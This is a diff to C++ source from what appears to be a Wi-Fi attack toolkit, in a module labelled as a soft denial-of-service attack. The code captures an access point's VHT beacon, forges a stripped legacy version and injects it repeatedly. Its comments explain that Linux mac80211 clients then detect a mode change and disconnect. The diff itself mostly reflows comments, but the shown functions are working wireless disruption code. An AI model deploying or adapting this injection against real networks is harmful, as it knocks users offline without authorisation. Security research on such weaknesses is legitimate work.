@@ -1,7 +1,6 @@
 #include "attacks/DoS_soft/expected_vht_beacon/expected_vht_beacon.h"
 
 #include <chrono>
-#include <thread>
 #include <tins/tins.h>
 
 #include "attacks/components/setup_connections.h"
@@ -20,12 +19,14 @@ using namespace std;
 using namespace chrono;
 using namespace Tins;
 
-// Build a legacy-looking beacon from a real VHT beacon:
-// keeps only the IEs visible in the target frame (SSID, rates, DS, TIM, RSN, op-classes)
-// sets capabilities to ESS+ShortPreamble (0x0011), drops VHT_CAP / VHT_OP and everything else.
+// build a legacy-looking beacon from a real VHT beacon
+// keeps only (SSID, rates, DS, TIM, RSN, op-classes)
+// sets capabilities to ESS+ShortPreamble (0x0011)
+// drops VHT_CAP / VHT_OP and everything else
 
-// mac80211 then fires "AP appears to change mode (expected VHT, found legacy)" and disconnects (on 2_4GHz)
-// on 5GHz not disconnect without similar log
+// mac80211 then fires "AP appears to change mode (expected VHT, found legacy)"
+// - disconnects (on 2_4GHz)
+// - on 5GHz disconnect without similar log
 static Dot11Beacon build_legacy_beacon(const Dot11Beacon &src) {
 	Dot11Beacon result(src.addr1(), src.addr2());
 	result.addr3(src.addr3());
@@ -51,7 +52,7 @@ static Dot11Beacon build_legacy_beacon(const Dot11Beacon &src) {
 static void inject_legacy_beacons(
 	const HWAddress<6> &ap_mac, const string &iface, const int attack_time_sec, const int ms_interval) {
 	log(LogLevel::INFO, "Scanning for AP beacon on {}", iface);
-	const auto real_beacon = scan::RSN_scan(iface, 20, ap_mac);
+	const auto real_beacon = scan::RSN_scan(iface, 20, ap_mac); //TODO hardcoded
 	if(!real_beacon) throw run_err("expected_vht_beacon: AP beacon not found - check channel and AP MAC");
 
 	log(LogLevel::INFO, "Beacon captured, stripping VHT IEs and injecting");
